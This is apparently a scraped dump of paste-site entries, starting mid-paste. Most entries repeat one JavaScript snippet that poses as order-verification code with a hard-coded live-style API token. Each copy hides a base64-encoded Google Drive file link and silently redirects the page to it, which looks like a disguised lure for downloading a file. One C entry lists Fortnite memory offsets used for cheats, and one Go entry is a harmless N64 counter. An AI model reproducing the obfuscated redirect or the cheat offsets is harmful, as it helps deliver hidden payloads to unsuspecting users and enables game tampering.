  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iWuGQAE3,Untitled,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:43:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/208/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YuEG8LAt,Products.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:28:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/583/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mQxpeB15,Untitled,RayTheLocker123123,C,Friday 28th of March 2025 05:27:38 PM CDT,"#define GWORLD 0x1771c988
#define FNAME 0x1792E740                     //0x130C2A80
#define GAME_INSTANCE 0x208 //0x210 
#define LOCAL_PLAYERS 0x38
#define PLAYER_CONTROLLER 0x30 
#define LOCAL_PAWN 0x350
#define CURRENT_WEAPON 0xa80 
#define VELOCITY 0x180 //CompentVELOCITY
#define GRAVITY 0x8a2 // bUseGravity
#define PAWN_PRIVATE 0x320
#define location_under_reticle  0x27f0 // https://dumpspace.spuckwaffel.com/Games/?hash=6b77eceb&type=classes&idx=AFortPlayerController&member=LocationUnderReticle
#define ROOT_COMPONENT 0x1B0
#define RELATIVE_LOCATION 0x138
#define PLAYER_STATE 0x2c8
#define PLAYER_CAMARA_MANEGER 0x360
#define GAME_STATE 0x190 /// 0x188 //0x190
#define PLAYER_ARRAY 0x2C0
#define MESH 0x328
#define Playername 0xb08
#define TEAM_INDEX 0x1259
#define WEAPON_DATA 0x570
#define CURRENT_WEAPON 0xa80
#define AMMO_COUNT 0xefc
#define COMPONENT_TO_WORLD 0x1E0
#define CURRENT_VEHICLE 0x2b40
#define BONE_ARRAY 0x5c8
#define BONE_ARRAY_ACCHE 0x5b8
#define LAST_SUMBIT_TIME 0x2E8
#define LAST_SUMBIT_TIME_ON_SCREEN 0x2F0
#define ProjectileSpeed 0x1d48  //ProjectileSpeed  
#define ProjectileGravityScale 0x1dfc // ProjectileGravityScale
#define PLATFORM 0x430
#define HABANERO_COMPONENT 0xa48
#define RANKED_PROGRESS 0xd0
#define PLAYER_ID 0x2ac
#define b_is_dying 0x718
#define ITEM_NAME 0x40
#define TargetedFortPawn 0x1990

#define KILL_COUNT 0x126c // https://dumpspace.spuckwaffel.com/Games/?hash=6b77eceb&type=classes&idx=AFortPlayerStateAthena&member=KillScore
#define FortPTR uintptr_t"
nSA9W5yc,Order.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:12:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/547/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UhBbr3TK,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 04:57:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/074/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ThcUK6vb,count_burgers,drpanwe,Go,Friday 28th of March 2025 04:37:37 PM CDT,"package main

import (
	""fmt""
	""image""
	""image/color""
	imgdraw ""image/draw""

	""github.com/clktmr/n64/drivers/display""
	n64draw ""github.com/clktmr/n64/drivers/draw""
	""github.com/clktmr/n64/fonts/gomono12""
	_ ""github.com/clktmr/n64/machine""
	""github.com/clktmr/n64/rcp/video""
)

var burgers int64 = 0

func main() {
	// Initialize the N64 system
	video.SetupPAL(false, false)

	// Create a framebuffer
	video.SetupPAL(false, false)
	resolution := video.NativeResolution().Div(2)
	disp := display.NewDisplay(resolution, video.BPP16)

	// Create a rendering rdp
	rdp := n64draw.NewRdp()

	// Create a font face with the gomono12 font
	font := gomono12.NewFace(gomono12.X0000_00ff())

	// Main game loop
	for {
		// Clear the screen
		rdp.SetFramebuffer(disp.Swap())
		rdp.Draw(rdp.Bounds(), &image.Uniform{color.Black}, image.Point{}, imgdraw.Src)

		// Increment burger counter
		burgers++

		// Draw text at position (10, 10) in white
		text := fmt.Sprintf(""Burgers: %d"", burgers)
		rdp.DrawText(rdp.Bounds(), font, image.Point{10, 10}, color.White, nil, []byte(text))

		// Flush the RDP
		rdp.Flush()
	}
}
"
inqkxag6,Products.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 04:26:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/616/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
